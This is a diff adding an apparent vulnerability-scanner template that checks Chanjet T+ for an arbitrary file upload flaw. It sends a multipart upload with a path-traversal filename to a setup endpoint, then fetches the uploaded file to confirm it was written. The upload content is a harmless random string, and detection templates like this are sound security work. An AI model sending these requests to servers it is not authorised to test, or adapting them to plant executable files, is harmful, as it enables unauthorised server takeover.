@@ -1,0 +1,40 @@
+id: chanjet-Tplus-file-upload
+
+info:
+  name: chanjet-Tplus-file-upload
+  author: hufei
+  severity: critical
+  description: |
+    Arbitrary file upload vulnerability in chanjet-Tplus Integrated Security Management Platform Software allows attackers to upload and execute malicious files, leading to potential unauthorized server control.
+  reference:
+  metadata:
+    max-request: 2
+    fofa-query:
+  tags: chanjet-Tplus,fileupload,intrusive
+
+variables:
+  str1: '{{rand_base(6)}}'
+  str2: '{{rand_base(6)}}'
+
+http:
+  - raw:
+      - |
+        POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=7389b73c3c705c1b86f1fc81896927ce
+        
+        --7389b73c3c705c1b86f1fc81896927ce
+        Content-Disposition: form-data; name="File1"; filename="../{{str1}}.asxp"
+        Content-Type: image/jpeg
+        
+        {{str2}}
+        --7389b73c3c705c1b86f1fc81896927ce--
+
+      - |
+        GET /tplus/SM/SetupAccount/{{str1}}.asxp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - body_2 == str2
